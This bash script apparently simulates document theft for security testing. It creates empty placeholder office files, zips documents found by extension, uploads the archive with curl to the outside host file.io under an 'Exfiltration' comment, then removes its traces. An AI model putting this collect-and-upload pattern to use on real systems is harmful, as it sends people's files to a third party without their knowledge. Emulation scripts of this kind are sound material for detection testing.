#!/bin/bash
#Author: Thomas Martin Grome - thomas@grome.dev

function install_prereqs () {
    zip=`which zip 2>/dev/null`
    curl=`which curl 2>/dev/null`

    if [ -z $zip ] || [ -z $curl ]
    then
        yum=`which yum 2>/dev/null`
        apt=`which apt 2>/dev/null`
        zypper=`which zypper 2>/dev/null`

        if [[ -z ${yum}${apt}${zypper} ]]
        then
            echo "Unsupported distro"
            exit 1
        fi

        sudo ${yum}${apt}${zypper} install zip curl -y
    fi
}

function remove_prereqs () {
    if [ -z $zip ]
    then
        sudo ${yum}${apt}${zypper} remove zip -y
    fi

    if [ -z $curl ]
    then
        sudo ${yum}${apt}${zypper} remove curl -y
    fi
}

function setup () {
    # Add temporary files for collection
    files_dir=`mktemp -d /tmp/support_files.XXXXXX`
    cd $files_dir
    echo $files_dir
    touch file_example.doc file_example.docx file_example.ppt file_example.pptx file_example.xls file_example.pdf file_example.txt
    cd - 
}

function execution () {
    # Collection
    find $files_dir -type f \( -name "*.doc" -o -name "*.docx" -o -name "*.pdf" -o -name "*.pptx" -o -name "*.txt" \) -print | zip /tmp/staging.zip -@

    # Exfiltration
    curl -F "file=@/tmp/staging.zip" https://file.io/?expires=1d
}

function cleanup () {
    # Cleanup temporary files
    rm -f /tmp/staging.zip
    # Remove the temporary collected files
    rm -rf $files_dir
}

function main () {
    install_prereqs
    setup
    execution
    cleanup
    remove_prereqs
}

main $*
